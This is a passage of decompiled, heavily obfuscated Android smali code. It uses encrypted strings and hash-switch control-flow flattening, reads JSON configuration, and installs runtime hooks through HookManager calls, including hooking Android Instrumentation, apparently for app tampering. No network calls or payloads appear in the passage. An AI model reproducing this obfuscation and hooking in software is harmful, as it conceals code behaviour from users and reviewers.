    const-string v7, "QUIAGiwEntA=\n"

    invoke-static {v2, v7}, LCu7y/sdk/y7;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    const/4 v7, 0x1

    invoke-virtual {v6, v2, v7}, Lorg/json/JSONObject;->optBoolean(Ljava/lang/String;Z)Z

    move-result v2

    if-eqz v2, :cond_1f

    const-string v2, "\u06eb\u06e2\u06e5\u06db\u06e5\u06d9\u06da\u06e2\u06e6\u06d8\u06d6\u06e8\u06df\u06e8\u06d9\u06e5\u06d8\u06d7\u06e8\u06eb\u06d7\u06e5\u06e7\u06da\u06da\u06e1\u06eb\u06eb\u06da\u06da\u06ec\u06e6\u06d8"

    goto :goto_5d

    :cond_1f
    const-string v2, "\u06e0\u06e1\u06e6\u06d8\u06e5\u06e1\u06e0\u06d7\u06db\u06dc\u06d6\u06eb\u06e5\u06d8\u06e0\u06e7\u06e8\u06d8\u06e5\u06e0\u06eb\u06e8\u06dc\u06d7\u06d9\u06d7\u06d7\u06da\u06e4\u06e6\u06d8\u06d9\u06d9\u06df\u06dc\u06d9\u06e6\u06d8\u06eb\u06df\u06e5\u06e4\u06e5\u06d9\u06e6\u06df"

    goto :goto_5d

    :sswitch_f6
    const-string v2, "\u06eb\u06eb\u06e0\u06e1\u06da\u06d8\u06e6\u06d6\u06e7\u06db\u06e7\u06db\u06da\u06e6\u06e7\u06eb\u06dc\u06d8\u06d9\u06d7\u06e6\u06d8\u06d7\u06da\u06e6\u06db\u06d9\u06d6\u06df\u06eb\u06ec\u06e6\u06dc\u06df\u06d6\u06d6\u06df\u06e5\u06eb\u06ec\u06dc\u06eb\u06e7\u06e1\u06d6\u06df\u06d9\u06ec\u06da\u06e4\u06e1\u06e5\u06d8\u06df\u06da\u06e6\u06d8"

    goto :goto_5d

    :sswitch_f7
    const-string v2, "\u06e8\u06d9\u06db\u06ec\u06db\u06e0\u06d9\u06e8\u06e7\u06d8\u06e6\u06d9\u06e1\u06e1\u06e0\u06da\u06e1\u06e8\u06e1\u06db\u06e2\u06e8\u06d8\u06d7\u06d7\u06e5\u06d8\u06d9\u06d6\u06e7\u06d8\u06e2\u06d9\u06e4\u06ec\u06e1\u06dc\u06dc\u06e2\u06d6\u06d8\u06e8\u06e6\u06e7\u06e4\u06db\u06ec"

    goto :goto_5b

    :sswitch_f8
    const-string v2, "YxDKEYOB4a5kAcQ=\n"

    const-string v4, "DXW9cOD1iNg=\n"

    invoke-static {v2, v4}, LCu7y/sdk/y7;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v6, v2}, Lorg/json/JSONObject;->optJSONArray(Ljava/lang/String;)Lorg/json/JSONArray;

    move-result-object v4

    const v5, 0x30d5f9f3

    const-string v2, "\u06df\u06ec\u06d9\u06d9\u06e4\u06e5\u06d8\u06e0\u06e6\u06d7\u06dc\u06e5\u06df\u06eb\u06e8\u06e2\u06e5\u06d8\u06e1\u06dc\u06df\u06d8\u06d8\u06e7\u06da\u06e4\u06e6\u06da\u06dc\u06d8\u06eb\u06d9\u06df"

    :goto_5e
    invoke-virtual {v2}, Ljava/lang/String;->hashCode()I

    move-result v6

    xor-int/2addr v6, v5

    sparse-switch v6, :sswitch_data_45

    goto :goto_5e

    :sswitch_f9
    const v5, -0x90f7eab

    const-string v2, "\u06dc\u06d8\u06d9\u06d8\u06d8\u06e1\u06d8\u06e6\u06dc\u06da\u06dc\u06d7\u06eb\u06da\u06e1\u06d6\u06d8\u06ec\u06d9\u06e1\u06e4\u06d8\u06eb\u06d9\u06e2\u06e5\u06d6\u06ec\u06dc\u06d6\u06d7\u06d8\u06da\u06e8\u06e6\u06e4\u06e1\u06e6\u06e4\u06e4\u06d6\u06d8\u06e0\u06e0\u06da\u06db\u06e1\u06eb\u06e4\u06e0\u06d7"

    :goto_5f
    invoke-virtual {v2}, Ljava/lang/String;->hashCode()I

    move-result v6

    xor-int/2addr v6, v5

    sparse-switch v6, :sswitch_data_46

    goto :goto_5f

    :sswitch_fa
    invoke-static/range {p3 .. p3}, Lapi/repository/HookManager;->initHooks(Landroid/content/Context;)V

    goto/16 :goto_2d

    :sswitch_fb
    const-string v2, "\u06d9\u06db\u06da\u06df\u06d9\u06e7\u06da\u06ec\u06e6\u06d8\u06df\u06e4\u06e6\u06d8\u06d8\u06e7\u06ec\u06df\u06da\u06e2\u06da\u06df\u06db\u06eb\u06dc\u06e1\u06d8\u06d7\u06e6\u06db\u06db\u06ec\u06dc\u06eb\u06db\u06e6\u06d8\u06d8\u06e1\u06d9\u06e4\u06d9\u06e6\u06e8\u06e0\u06e5\u06d8"

    goto :goto_5e

    :sswitch_fc
    const v6, -0x156de9d1

    const-string v2, "\u06d6\u06e8\u06e4\u06d7\u06db\u06e5\u06d8\u06d6\u06dc\u06da\u06db\u06ec\u06e0\u06db\u06db\u06e8\u06d8\u06e6\u06d8\u06db\u06da\u06dc\u06e6\u06e1\u06e5\u06e1\u06d8\u06db\u06da\u06e5\u06d7\u06dc\u06eb"

    :goto_60
    invoke-virtual {v2}, Ljava/lang/String;->hashCode()I

    move-result v7

    xor-int/2addr v7, v6

    sparse-switch v7, :sswitch_data_47

    goto :goto_60

    :sswitch_fd
    const-string v2, "\u06e7\u06e5\u06dc\u06d8\u06e8\u06e2\u06eb\u06e5\u06e6\u06ec\u06d9\u06e8\u06d8\u06d8\u06eb\u06e1\u06e2\u06d6\u06d9\u06e5\u06d8\u06eb\u06eb\u06dc\u06d8\u06d6\u06dc\u06dc\u06df\u06d8\u06d9\u06db\u06d7\u06e7\u06e5\u06d6\u06d8\u06d6\u06df\u06d7\u06dc\u06e5\u06d8\u06d8\u06db\u06e0\u06d9\u06df\u06d8\u06e4\u06df\u06d9"

    goto :goto_5e

    :cond_20
    const-string v2, "\u06e1\u06e4\u06d6\u06ec\u06df\u06e8\u06dc\u06e7\u06ec\u06e2\u06db\u06dc\u06d8\u06ec\u06e4\u06e7\u06d7\u06df\u06dc\u06e7\u06eb\u06e5\u06e2\u06e4\u06d9\u06e0\u06e4\u06ec\u06df\u06d9\u06e1\u06d8\u06e0\u06ec\u06d8\u06d8\u06d6\u06da\u06e0\u06df\u06d6\u06ec\u06e7\u06db\u06e7\u06e4\u06df\u06ec\u06d8\u06e4"

    goto :goto_60

    :sswitch_fe
    if-eqz v4, :cond_20

    const-string v2, "\u06db\u06e4\u06d7\u06e2\u06e0\u06d7\u06e8\u06e2\u06e7\u06d9\u06d8\u06d6\u06e0\u06e6\u06e8\u06df\u06d7\u06e5\u06e4\u06d7\u06e6\u06dc\u06dc\u06e7\u06d8\u06db\u06df\u06d9\u06e1\u06eb\u06ec\u06d6\u06d6\u06d6\u06d8\u06d7\u06d6\u06e0\u06e2\u06ec\u06e8\u06d8\u06e8"

    goto :goto_60

    :sswitch_ff
    const-string v2, "\u06dc\u06e0\u06df\u06d7\u06e6\u06d8\u06d9\u06e6\u06e0\u06e1\u06e2\u06d9\u06e4\u06db\u06d9\u06d9\u06eb\u06e8\u06d8\u06d9\u06e7\u06e0\u06d6\u06e1\u06e4\u06e5\u06e0\u06e8\u06d9\u06d7\u06e1\u06d8\u06e2\u06e6\u06eb\u06d7\u06da\u06e7\u06d8\u06e8\u06e1\u06d8\u06dc\u06da\u06e1"
    :try_end_2c
    .catch Ljava/lang/Exception; {:try_start_2c .. :try_end_2c} :catch_6

    goto :goto_60

    :sswitch_100
    const-string v2, "\u06e5\u06da\u06e6\u06e0\u06e6\u06e5\u06d8\u06e0\u06e7\u06e2\u06db\u06d8\u06e6\u06d8\u06d8\u06e0\u06e8\u06e8\u06e4\u06e5\u06d8\u06d6\u06e2\u06df\u06db\u06eb\u06d7\u06df\u06e1\u06d6\u06d8\u06d9\u06df\u06e5\u06d8\u06db\u06d8\u06dc\u06e4\u06e0\u06e2\u06e6\u06d9\u06e0\u06e1\u06d7\u06d8\u06e2\u06ec\u06e5\u06dc\u06eb\u06e5\u06dc\u06db\u06df\u06e1\u06eb\u06da"

    goto :goto_5e

    :sswitch_101
    :try_start_2d
    const-string v2, "\u06e2\u06e6\u06e2\u06d7\u06e1\u06e1\u06e4\u06e4\u06e5\u06d8\u06d6\u06da\u06d8\u06ec\u06e7\u06d6\u06d8\u06d6\u06e6\u06e0\u06e4\u06e0\u06df\u06d8\u06da\u06e4\u06e8\u06e4\u06e4\u06e4\u06e1\u06e5\u06d8\u06db\u06eb\u06df\u06e8\u06e0\u06dc\u06d8\u06e1\u06d8\u06eb\u06dc\u06e2\u06e1\u06d8\u06e8\u06db\u06e8\u06e1\u06e0\u06d9"

    goto :goto_5f

    :sswitch_102
    const v6, 0x12a45b62

    const-string v2, "\u06e8\u06e5\u06d6\u06d8\u06e2\u06d7\u06ec\u06dc\u06eb\u06e8\u06d8\u06e0\u06d6\u06e4\u06e2\u06dc\u06e8\u06e4\u06e8\u06d6\u06d8\u06db\u06eb\u06db\u06e0\u06e5\u06d7\u06e0\u06e5\u06e5\u06d7\u06df\u06e2\u06dc\u06d7\u06d8\u06dc\u06df\u06d8\u06d8\u06e7\u06e7\u06dc\u06d8\u06ec\u06eb\u06e6\u06d8"

    :goto_61
    invoke-virtual {v2}, Ljava/lang/String;->hashCode()I

    move-result v7

    xor-int/2addr v7, v6

    sparse-switch v7, :sswitch_data_48

    goto :goto_61

    :sswitch_103
    const-string v2, "\u06e1\u06d8\u06e2\u06e2\u06e7\u06eb\u06e8\u06d6\u06dc\u06d8\u06d7\u06e0\u06eb\u06d8\u06e0\u06d6\u06e5\u06df\u06df\u06e6\u06e2\u06e1\u06d8\u06e4\u06e1\u06e6\u06d8\u06dc\u06eb\u06d9\u06d9\u06dc\u06d6"

    goto :goto_61

    :cond_21
    const-string v2, "\u06eb\u06df\u06e6\u06d8\u06da\u06d7\u06e2\u06dc\u06e2\u06e6\u06d8\u06d9\u06d6\u06e1\u06e8\u06e8\u06db\u06db\u06e1\u06db\u06e2\u06e5\u06e7\u06d8\u06d8\u06d7\u06e7\u06d7\u06e0\u06e1\u06d8\u06d9\u06ec\u06d6\u06e6\u06e5\u06d9\u06e5\u06d9"

    goto :goto_61

    :sswitch_104
    invoke-virtual {v4}, Lorg/json/JSONArray;->length()I

    move-result v2

    if-lez v2, :cond_21

    const-string v2, "\u06d6\u06ec\u06d8\u06d8\u06d6\u06e2\u06eb\u06e2\u06e4\u06e8\u06ec\u06e8\u06d6\u06db\u06df\u06d7\u06dc\u06d6\u06e0\u06da\u06df\u06e7\u06e6\u06d8\u06da\u06e8\u06e8\u06ec\u06dc\u06da\u06db\u06e1\u06e8\u06e4\u06e1\u06d8\u06e7\u06e1\u06e7\u06e6\u06e8\u06dc\u06e0\u06e5\u06e8\u06d6\u06db\u06e8\u06e0\u06d6\u06e8\u06d8\u06e2\u06d7\u06d8"

    goto :goto_61

    :sswitch_105
    const-string v2, "\u06e2\u06e5\u06d9\u06e0\u06e0\u06e8\u06d8\u06d8\u06da\u06dc\u06d8\u06e1\u06e1\u06d8\u06e1\u06e8\u06eb\u06df\u06e1\u06ec\u06e0\u06e8\u06d6\u06d8\u06d7\u06d7\u06d7\u06e4\u06e7\u06e6\u06db\u06dc\u06ec\u06da\u06e1\u06eb\u06df\u06d8\u06e8\u06d8\u06d6\u06d6\u06dc\u06e1\u06e5\u06d6\u06d8"

    goto :goto_5f

    :sswitch_106
    const-string v2, "\u06ec\u06e0\u06d8\u06d8\u06dc\u06e5\u06d8\u06e4\u06db\u06d7\u06e0\u06e2\u06d8\u06d8\u06ec\u06d8\u06e1\u06d8\u06e8\u06dc\u06e7\u06e8\u06e6\u06d8\u06d8\u06e6\u06e2\u06e6\u06d8\u06db\u06da\u06e1\u06d8\u06e2\u06d6\u06e5\u06e2\u06e6\u06d7\u06e6\u06e2\u06db\u06df\u06e7\u06df\u06ec\u06da\u06e4\u06e4\u06e6\u06ec\u06d6\u06e1\u06ec\u06e7\u06d9\u06e6\u06da\u06e0\u06dc"

    goto :goto_5f

    :sswitch_107
    invoke-static/range {p3 .. p3}, Lapi/repository/HookManager;->hookInstrumentation(Landroid/content/Context;)V

    goto/16 :goto_2d

    :sswitch_108
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "BIbYSugYqO5dwdsJefkiLokU\n"

    const-string v6, "7ClvrFmaTUo=\n"

    invoke-static {v4, v6}, LCu7y/sdk/y7;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v2, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2, v5}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    const-string v4, "ioAcD0clV6f1snm5LWpq1w==\n"

    const-string v5, "ZTyQPqCCxUI=\n"

    invoke-static {v4, v5}, LCu7y/sdk/y7;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v2, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    const-string v4, "hY3ytjw=\n"

    const-string v5, "4P+A2U46gto=\n"

    invoke-static {v4, v5}, LCu7y/sdk/y7;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-static {v2, v4}, LCu7y/sdk/x7;->logToFloatingWindow(Ljava/lang/String;Ljava/lang/String;)V
    :try_end_2d
    .catch Ljava/lang/Exception; {:try_start_2d .. :try_end_2d} :catch_6

    const/4 v2, 0x0

    const/4 v4, 0x0

    aget v4, p4, v4

    add-int/lit8 v4, v4, 0x1

    aput v4, p4, v2

    move-object v2, v3

    goto/16 :goto_20

    :sswitch_109
    const-string v3, "\u06e7\u06e2\u06d8\u06d8\u06d8\u06e0\u06e8\u06e7\u06e2\u06dc\u06df\u06e2\u06e6\u06d8\u06d8\u06db\u06d8\u06df\u06dc\u06e5\u06e7\u06d6\u06d8\u06d8\u06eb\u06e5\u06e4\u06da\u06e8\u06dc\u06d8\u06d8\u06d9\u06e2\u06e4\u06e7\u06eb\u06e1\u06e4\u06d6"

    goto/16 :goto_21

    :sswitch_10a
    const v5, 0x4216eebe

    const-string v3, "\u06e6\u06e5\u06e5\u06d8\u06e0\u06e7\u06db\u06d9\u06e0\u06dc\u06dc\u06d8\u06d8\u06d8\u06d8\u06d9\u06dc\u06d9\u06e6\u06d8\u06d8\u06da\u06d8\u06eb\u06e4\u06da\u06e0\u06d8\u06e1\u06e7"

    :goto_62
    invoke-virtual {v3}, Ljava/lang/String;->hashCode()I

    move-result v6

    xor-int/2addr v6, v5

    sparse-switch v6, :sswitch_data_49

    goto :goto_62

    :sswitch_10b
    const-string v3, "\u06e4\u06eb\u06d8\u06d8\u06e1\u06db\u06eb\u06e7\u06d8\u06e8\u06df\u06e1\u06e5\u06d9\u06db\u06e6\u06e7\u06e5\u06df\u06d6\u06e5\u06e8\u06d8\u06e2\u06e1\u06e0\u06d8\u06e7\u06e4\u06e8\u06d9\u06da\u06e5\u06e8\u06d8\u06d6\u06e5\u06e0\u06e5\u06d9\u06d8\u06d8\u06e1\u06ec\u06e1\u06db\u06e0\u06d8\u06d8\u06d9\u06ec\u06e7\u06e8\u06eb\u06e4\u06e5\u06da\u06e8\u06d8"

    goto/16 :goto_21

    :cond_22
    const-string v3, "\u06d7\u06eb\u06e6\u06d8\u06db\u06d9\u06d9\u06d6\u06dc\u06eb\u06e7\u06e1\u06d9\u06e1\u06e6\u06d8\u06eb\u06e4\u06e2\u06d7\u06dc\u06e8\u06ec\u06d7\u06e6\u06df\u06d9\u06e5\u06d8\u06d9\u06e7\u06d6\u06e2\u06e7\u06dc\u06dc\u06df\u06e1\u06d6\u06e2\u06df\u06e8\u06e0\u06db"

    goto :goto_62

    :sswitch_10c
    const/4 v3, 0x0

    aget v3, p4, v3

    const/4 v6, 0x3

    if-lt v3, v6, :cond_22

    const-string v3, "\u06e5\u06e7\u06e2\u06eb\u06e7\u06e8\u06d6\u06d7\u06d8\u06df\u06eb\u06d7\u06d6\u06e6\u06d6\u06d8\u06d7\u06e2\u06e6\u06d8\u06d8\u06e8\u06df\u06d8\u06da\u06e8\u06e0\u06e4\u06da\u06e6\u06dc\u06d8"

    goto :goto_62

    :sswitch_10d
    const-string v3, "\u06e7\u06d8\u06e1\u06d8\u06d9\u06e2\u06d6\u06e7\u06d6\u06e6\u06e5\u06e4\u06db\u06eb\u06e5\u06e4\u06e8\u06e6\u06d6\u06d8\u06e2\u06db\u06d9\u06e5\u06e8\u06dc\u06da\u06e2\u06d7\u06d7\u06da\u06da\u06e8\u06e7\u06e7\u06e5\u06d7\u06dc\u06e1\u06e5\u06e4\u06e7\u06e8\u06d8\u06e8\u06e7\u06e0\u06dc\u06d6\u06dc\u06d8\u06df\u06dc\u06e7\u06db\u06e8\u06dc"

    goto :goto_62

    :sswitch_10e
    const-string v3, "\u06d6\u06db\u06e4\u06df\u06d7\u06da\u06d9\u06d9\u06e8\u06d8\u06d7\u06dc\u06d6\u06dc\u06d9\u06e1\u06d8\u06e4\u06d7\u06d8\u06d8\u06e8\u06e8\u06ec\u06e7\u06e8\u06d8\u06d8\u06e8\u06d8\u06dc\u06d6\u06da\u06d7\u06ec\u06e4\u06d6\u06e8\u06da\u06da\u06d9\u06e5\u06db\u06d7\u06e1"

    goto/16 :goto_21

    :sswitch_10f
    const-string v3, "\u06df\u06d9\u06d6\u06d8\u06ec\u06e8\u06e7\u06d8\u06db\u06db\u06d6\u06d7\u06e1\u06d7\u06db\u06e4\u06e7\u06d6\u06e0\u06ec\u06df\u06dc\u06e6\u06d8\u06e6\u06e2\u06e8\u06d8\u06d8\u06e6\u06e1\u06d8\u06e8\u06e0\u06d9\u06df\u06df\u06d9\u06d8\u06da\u06e4\u06dc\u06e1\u06d8\u06e8\u06df\u06db"

    goto/16 :goto_22

    :sswitch_110
    const v5, 0x8f27a44

    const-string v3, "\u06da\u06d7\u06e5\u06d8\u06db\u06e6\u06d9\u06d7\u06e8\u06e2\u06df\u06db\u06dc\u06d8\u06e2\u06d6\u06e1\u06d8\u06eb\u06df\u06dc\u06e2\u06d6\u06da\u06e0\u06d8\u06e6\u06e7\u06e6\u06df\u06e4\u06eb"

    :goto_63
    invoke-virtual {v3}, Ljava/lang/String;->hashCode()I

    move-result v6

    xor-int/2addr v6, v5

    sparse-switch v6, :sswitch_data_4a

    goto :goto_63

    :sswitch_111
    const-string v3, "\u06d8\u06d9\u06e6\u06d7\u06e1\u06d8\u06d8\u06e1\u06e4\u06ec\u06db\u06da\u06d7\u06d9\u06e1\u06eb\u06e8\u06d9\u06e1\u06e2\u06e4\u06d8\u06d8\u06d8\u06e6\u06e1\u06d8\u06e2\u06da\u06e2\u06db\u06e5\u06d8\u06da\u06e1\u06e7\u06d8\u06e5\u06ec\u06e4\u06e5\u06eb\u06d6\u06db\u06e4\u06d8\u06d8\u06d7\u06d7\u06e5\u06e1\u06e7\u06dc\u06d8"

    goto/16 :goto_22

    :cond_23
    const-string v3, "\u06d9\u06df\u06e8\u06d8\u06df\u06e1\u06e1\u06df\u06ec\u06e8\u06e6\u06e7\u06e8\u06d9\u06e2\u06e5\u06da\u06e6\u06eb\u06db\u06d6\u06e6\u06d8\u06d7\u06d8\u06e4\u06e2\u06e6\u06e1\u06d8\u06ec\u06e2\u06dc\u06d8\u06df\u06e6\u06e4\u06eb\u06e6\u06e5\u06d8\u06e7\u06e6\u06d7\u06e4\u06e2\u06d8\u06da\u06e1\u06e0\u06e7\u06d8\u06d8"

    goto :goto_63

    :sswitch_112
    const/4 v3, 0x0

    aget v3, p0, v3

    if-nez v3, :cond_23

    const-string v3, "\u06e1\u06dc\u06e1\u06e5\u06e0\u06df\u06e2\u06e7\u06e1\u06d8\u06e5\u06e8\u06e0\u06e2\u06e6\u06d9\u06d6\u06e6\u06e5\u06d8\u06d7\u06da\u06e8\u06e6\u06dc\u06e7\u06e8\u06e1\u06e2\u06da\u06e5\u06eb\u06e6\u06d8\u06eb\u06e4\u06df\u06d7\u06e0\u06df\u06e8\u06d8\u06dc\u06e6\u06e1\u06d8\u06db\u06e1\u06dc\u06d9\u06e7"

    goto :goto_63

    :sswitch_113
    const-string v3, "\u06e1\u06d7\u06db\u06df\u06da\u06e8\u06d8\u06e8\u06eb\u06da\u06e1\u06ec\u06e1\u06d8\u06e4\u06df\u06db\u06e8\u06db\u06e8\u06e5\u06dc\u06e6\u06d7\u06d7\u06df\u06dc\u06e7\u06dc\u06da\u06e0\u06e8\u06d8\u06e6\u06e2\u06e8\u06d8\u06df\u06eb\u06d8\u06d8"

    goto :goto_63

    :sswitch_114
    const-string v3, "\u06e7\u06e5\u06da\u06e8\u06eb\u06e6\u06d8\u06d8\u06e5\u06dc\u06d8\u06df\u06e8\u06e8\u06d8\u06e2\u06e1\u06d8\u06eb\u06d7\u06e6\u06d8\u06d8\u06e6\u06db\u06e5\u06d7\u06d8\u06d8\u06e5\u06df\u06dc\u06ec\u06eb\u06d6\u06d8"

    goto/16 :goto_22

    :sswitch_115
    const-string v3, "\u06e1\u06e8\u06dc\u06eb\u06e0\u06ec\u06e6\u06db\u06e4\u06d8\u06ec\u06e7\u06e5\u06eb\u06db\u06e1\u06da\u06d6\u06df\u06eb\u06d9\u06db\u06dc\u06e8\u06e7\u06db\u06d8\u06d8\u06e8\u06dc\u06e6\u06d9\u06e6\u06e6\u06e1\u06e7\u06e2"

    goto/16 :goto_23

    :sswitch_116
    const v6, 0x72f77cd3

    const-string v3, "\u06da\u06e1\u06e5\u06d8\u06db\u06e8\u06e8\u06d8\u06e0\u06d8\u06d6\u06d9\u06db\u06dc\u06eb\u06e6\u06e4\u06e7\u06e5\u06e0\u06d6\u06e7\u06e5\u06d8\u06e2\u06eb\u06e7\u06e4\u06e5\u06db\u06dc\u06d8\u06db\u06d6\u06df\u06d8\u06e7\u06e6\u06df\u06e6\u06e8\u06eb\u06e6\u06eb\u06e6\u06e6\u06e6\u06d8\u06d9\u06d9\u06db\u06e1\u06d8\u06e7\u06e6\u06e8\u06d8"

    :goto_64
    invoke-virtual {v3}, Ljava/lang/String;->hashCode()I

    move-result v7

    xor-int/2addr v7, v6

    sparse-switch v7, :sswitch_data_4b

    goto :goto_64

    :sswitch_117
    const-string v3, "\u06e1\u06d6\u06e2\u06db\u06ec\u06e0\u06e1\u06e8\u06e5\u06d8\u06df\u06e8\u06eb\u06e4\u06da\u06e4\u06dc\u06da\u06eb\u06d6\u06d7\u06e1\u06d8\u06eb\u06e2\u06d6\u06d8\u06e0\u06dc\u06e2\u06e0\u06e5\u06dc\u06d7\u06df\u06da\u06d6\u06da\u06e0\u06e6\u06eb\u06e5\u06db\u06df"

    goto/16 :goto_23

    :cond_24
    const-string v3, "\u06e5\u06e4\u06e5\u06e1\u06e7\u06e7\u06d8\u06e6\u06db\u06e7\u06da\u06e2\u06e0\u06e5\u06e0\u06d8\u06e1\u06d8\u06da\u06d9\u06e8\u06e0\u06e7\u06ec\u06e1\u06e1\u06d6\u06d8\u06e7\u06d9\u06e6\u06e7\u06d8\u06d9\u06e0\u06df\u06e0\u06e0\u06e8\u06e0\u06e6\u06e1\u06e1\u06ec\u06e7\u06e8\u06e6\u06d6\u06d8"

    goto :goto_64

    :sswitch_118
    if-nez v4, :cond_24

    const-string v3, "\u06d9\u06e4\u06ec\u06e7\u06d6\u06e1\u06d8\u06e8\u06d9\u06e8\u06e1\u06df\u06dc\u06d8\u06ec\u06e1\u06dc\u06d8\u06d6\u06eb\u06e6\u06e8\u06e6\u06eb\u06e7\u06db\u06e2\u06da\u06eb\u06da\u06e6\u06d6\u06e8\u06d6\u06d9\u06e8\u06e0\u06ec\u06d6\u06d8"

    goto :goto_64

    :sswitch_119
    const-string v3, "\u06d9\u06e5\u06e0\u06d7\u06e8\u06e4\u06df\u06ec\u06da\u06d8\u06d9\u06e7\u06d7\u06dc\u06e1\u06dc\u06e6\u06da\u06e2\u06e6\u06d9\u06e6\u06da\u06e5\u06ec\u06e5\u06d8\u06e6\u06da\u06e4\u06da\u06e4\u06d8\u06d9\u06e0\u06df\u06e6\u06df\u06d7\u06e2\u06d9\u06e2\u06e1\u06d6\u06e1\u06eb\u06df\u06e5\u06dc\u06da\u06dc\u06d8\u06e7\u06e2\u06d8"

    goto :goto_64

    :sswitch_11a
    const-string v3, "\u06df\u06eb\u06d7\u06e6\u06e0\u06eb\u06ec\u06dc\u06dc\u06d9\u06e1\u06d8\u06dc\u06df\u06d6\u06d8\u06e5\u06e5\u06e7\u06d8\u06e7\u06d8\u06dc\u06d8\u06e6\u06db\u06d8\u06d8\u06d6\u06e8\u06d8\u06e0\u06e8\u06e4\u06e1\u06e2\u06db\u06db\u06e8\u06e2\u06e1\u06e6\u06ec\u06e2\u06dc\u06da\u06dc\u06d8\u06e5\u06d8\u06da\u06d9\u06dc"

    goto/16 :goto_23

    :sswitch_11b
    const/4 v3, 0x0

    aget v3, p2, v3

    add-int/lit8 v3, v3, 0x1

    sget-object v4, LCu7y/sdk/g0;->a:[Ljava/lang/String;

    array-length v4, v4

    rem-int v4, v3, v4

    const/4 v3, 0x0

    aput v4, p2, v3

    const v5, -0x56e30073

    const-string v3, "\u06df\u06e6\u06df\u06eb\u06d9\u06e5\u06d8\u06d6\u06e4\u06e0\u06e4\u06db\u06e4\u06e2\u06eb\u06d8\u06d8\u06dc\u06eb\u06d8\u06e6\u06e7\u06d6\u06ec\u06e6\u06e6\u06d6\u06e7\u06d8\u06d8\u06ec\u06d6\u06e5\u06d8\u06eb\u06e7\u06e0\u06da\u06d8\u06d8\u06eb\u06e0\u06dc\u06d8\u06e7\u06da\u06e5\u06db\u06ec\u06e1\u06e2\u06eb"

    :goto_65
    invoke-virtual {v3}, Ljava/lang/String;->hashCode()I

    move-result v6

    xor-int/2addr v6, v5

    sparse-switch v6, :sswitch_data_4c

    goto :goto_65

    :sswitch_11c
    const/4 v3, 0x0

    const/4 v4, 0x1

    aput-boolean v4, p8, v3

    const v4, 0x58b647f7

    const-string v3, "\u06ec\u06e8\u06ec\u06e5\u06e0\u06eb\u06eb\u06e4\u06d7\u06d7\u06db\u06e7\u06d8\u06e6\u06e5\u06db\u06dc\u06dc\u06d8\u06e6\u06e6\u06e5\u06d8\u06e7\u06e6\u06e1\u06e6\u06e7\u06e8\u06d8\u06d9\u06e4\u06dc"

    :goto_66
    invoke-virtual {v3}, Ljava/lang/String;->hashCode()I

    move-result v5

    xor-int/2addr v5, v4

    sparse-switch v5, :sswitch_data_4d

    goto :goto_66

    :sswitch_11d
    const-string v3, "\u06e0\u06e6\u06e1\u06eb\u06eb\u06e5\u06e8\u06e8\u06d9\u06eb\u06df\u06e8\u06d8\u06db\u06da\u06e8\u06d8\u06e7\u06e2\u06e5\u06d6\u06d8\u06e2\u06e8\u06d9\u06e0\u06d6\u06d7\u06e7\u06eb\u06ec\u06d8\u06df\u06e1\u06e8\u06d8\u06db\u06e2\u06d6\u06d8\u06e2\u06df\u06d8\u06d8\u06e5\u06e6\u06e0\u06d8\u06e8\u06e6\u06d8\u06d6\u06eb\u06e7\u06e2\u06ec\u06e8\u06d8\u06eb\u06e1\u06df"

    goto :goto_66

    :sswitch_11e
    const-string v3, "\u06d7\u06e0\u06e2\u06e8\u06e6\u06e8\u06df\u06e5\u06eb\u06db\u06e4\u06e8\u06e7\u06eb\u06e7\u06e8\u06e2\u06df\u06d8\u06d8\u06e0\u06d7\u06e0\u06e5\u06e7\u06eb\u06e5\u06d8\u06d8\u06d9\u06e6\u06e0\u06dc\u06e1\u06d8\u06e2\u06eb\u06e8\u06d8\u06d7\u06e1\u06ec\u06e4\u06e1\u06e4\u06db\u06e6\u06e7\u06da\u06d9\u06e5\u06e6\u06da\u06e8\u06d8\u06e5"

    goto :goto_65

    :sswitch_11f
    const v6, -0x2b80d1bc

    const-string v3, "\u06e2\u06df\u06d7\u06d6\u06d6\u06dc\u06d8\u06eb\u06e1\u06e1\u06e0\u06ec\u06e6\u06d8\u06db\u06da\u06e5\u06d8\u06df\u06d8\u06eb\u06eb\u06e6\u06da\u06e5\u06dc\u06d6\u06e0\u06e6\u06d6\u06d6\u06e0\u06eb\u06d7\u06d8\u06e8\u06d8\u06e2\u06db\u06d6\u06d8\u06e4\u06d6\u06e8\u06d8\u06e7\u06dc\u06d8\u06df\u06e5\u06d6\u06d8\u06dc\u06dc\u06d6\u06d9\u06db\u06e2\u06da\u06df\u06e8"

    :goto_67
    invoke-virtual {v3}, Ljava/lang/String;->hashCode()I

    move-result v7

    xor-int/2addr v7, v6

    sparse-switch v7, :sswitch_data_4e

    goto :goto_67

    :sswitch_120
    const-string v3, "\u06d6\u06eb\u06d8\u06d8\u06dc\u06dc\u06d8\u06e0\u06e8\u06e7\u06d8\u06eb\u06e6\u06d6\u06dc\u06da\u06d9\u06df\u06d9\u06e1\u06d8\u06e6\u06e2\u06d6\u06d8\u06e2\u06e1\u06df\u06e8\u06dc\u06dc\u06db\u06eb\u06d8\u06d8\u06d9\u06d8\u06d9\u06e0\u06d8\u06ec\u06eb\u06db\u06e6\u06d8\u06e2\u06db\u06d6\u06d8\u06e5\u06dc\u06e0\u06e0\u06e4\u06e6\u06d8"

    goto :goto_65

    :cond_25
